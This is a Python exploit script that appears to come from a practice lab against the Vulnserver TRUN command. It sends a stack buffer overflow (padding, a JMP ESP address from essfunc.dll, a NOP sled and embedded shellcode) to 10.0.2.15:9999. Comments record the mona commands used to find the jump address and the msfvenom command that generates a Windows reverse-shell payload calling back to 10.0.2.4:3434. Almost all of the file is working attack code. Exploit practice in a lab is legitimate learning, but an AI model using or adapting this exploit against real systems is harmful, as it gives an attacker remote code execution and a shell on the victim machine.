import socket
import sys

myPayload =("\xda\xda\xb8\xfe\x62\x91\x42\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\x52\x31\x47\x17\x03\x47\x17\x83\x39\x66\x73\xb7\x39"
"\x8f\xf1\x38\xc1\x50\x96\xb1\x24\x61\x96\xa6\x2d\xd2\x26"
"\xac\x63\xdf\xcd\xe0\x97\x54\xa3\x2c\x98\xdd\x0e\x0b\x97"
"\xde\x23\x6f\xb6\x5c\x3e\xbc\x18\x5c\xf1\xb1\x59\x99\xec"
"\x38\x0b\x72\x7a\xee\xbb\xf7\x36\x33\x30\x4b\xd6\x33\xa5"
"\x1c\xd9\x12\x78\x16\x80\xb4\x7b\xfb\xb8\xfc\x63\x18\x84"
"\xb7\x18\xea\x72\x46\xc8\x22\x7a\xe5\x35\x8b\x89\xf7\x72"
"\x2c\x72\x82\x8a\x4e\x0f\x95\x49\x2c\xcb\x10\x49\x96\x98"
"\x83\xb5\x26\x4c\x55\x3e\x24\x39\x11\x18\x29\xbc\xf6\x13"
"\x55\x35\xf9\xf3\xdf\x0d\xde\xd7\x84\xd6\x7f\x4e\x61\xb8"
"\x80\x90\xca\x65\x25\xdb\xe7\x72\x54\x86\x6f\xb6\x55\x38"
"\x70\xd0\xee\x4b\x42\x7f\x45\xc3\xee\x08\x43\x14\x10\x23"
"\x33\x8a\xef\xcc\x44\x83\x2b\x98\x14\xbb\x9a\xa1\xfe\x3b"
"\x22\x74\x50\x6b\x8c\x27\x11\xdb\x6c\x98\xf9\x31\x63\xc7"
"\x1a\x3a\xa9\x60\xb0\xc1\x3a\x85\x45\xcb\xbe\xf1\x47\xcb"
"\xb3\x6b\xc1\x2d\xa1\x7b\x87\xe6\x5e\xe5\x82\x7c\xfe\xea"
"\x18\xf9\xc0\x61\xaf\xfe\x8f\x81\xda\xec\x78\x62\x91\x4e"
"\x2e\x7d\x0f\xe6\xac\xec\xd4\xf6\xbb\x0c\x43\xa1\xec\xe3"
"\x9a\x27\x01\x5d\x35\x55\xd8\x3b\x7e\xdd\x07\xf8\x81\xdc"
"\xca\x44\xa6\xce\x12\x44\xe2\xba\xca\x13\xbc\x14\xad\xcd"
"\x0e\xce\x67\xa1\xd8\x86\xfe\x89\xda\xd0\xfe\xc7\xac\x3c"
"\x4e\xbe\xe8\x43\x7f\x56\xfd\x3c\x9d\xc6\x02\x97\x25\xe6"
"\xe0\x3d\x50\x8f\xbc\xd4\xd9\xd2\x3e\x03\x1d\xeb\xbc\xa1"
"\xde\x08\xdc\xc0\xdb\x55\x5a\x39\x96\xc6\x0f\x3d\x05\xe6"
"\x05")

stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" +"\x90" * 32 + myPayload

try:
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect(("10.0.2.15",9999))
    bytes = stringToSend.encode(encoding="latin1")
    my_socket.send(bytes)
    my_socket.close()

except Exception as e:
    print(e)
    sys.exit()

    #EBP 41414141 and EIP 42424242
    #nasm > JMP ESP -> FFE4
    # !mona modules
    # !mona find -s "\xff\xe4 -m essfunc.dll
    # 625011af
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=3434 EXITFUNC=thread -f c -a x86 -b "\x00"
    #\x90 no op code

